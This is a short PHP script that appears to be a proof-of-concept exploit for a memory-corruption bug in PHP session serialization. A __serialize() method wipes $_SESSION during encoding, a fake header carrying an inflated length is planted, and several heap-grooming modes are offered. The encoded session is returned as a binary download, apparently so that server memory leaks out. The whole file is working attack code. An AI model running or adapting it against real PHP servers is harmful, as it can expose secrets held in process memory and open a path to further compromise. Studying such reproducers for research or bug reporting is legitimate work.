<?php
error_reporting(0);
ini_set('session.serialize_handler', 'php_serialize');
$mode = $_GET['mode'] ?? 'bucket';
$LEN = 32768;
$hdr = pack('V',1).pack('V',6).pack('P',0).pack('P',$LEN);
$payload = $hdr . str_repeat("M", 4096 - strlen($hdr));
$fp = fopen('php://memory', 'w');
class C {
    public $fp, $payload, $keep = [], $mode, $fh = null;
    function __construct($fp,$payload,$mode){$this->fp=$fp;$this->payload=$payload;$this->mode=$mode;}
    function __serialize() {
        $_SESSION = [];
        if ($this->mode === 'file_first') {
            $this->fh = fopen('/tmp/leakfile','w'); fwrite($this->fh, str_repeat('F',64));
        }
        $this->keep[] = stream_bucket_new($this->fp, $this->payload);
        if ($this->mode === 'file_after') {
            $this->fh = fopen('/tmp/leakfile','w'); fwrite($this->fh, str_repeat('F',64));
        }
        if ($this->mode === 'spl') {
            $this->fh = new SplFileObject('/tmp/leakfile','w');
            $this->fh->fwrite(str_repeat('F',64));
        }
        return [];
    }
}
session_start();
$_SESSION['Lz'] = new C($fp,$payload,$mode);
$_SESSION['s'] = str_repeat('A', 4050);
$s = session_encode();
header('Content-Type: application/octet-stream');
echo $s;
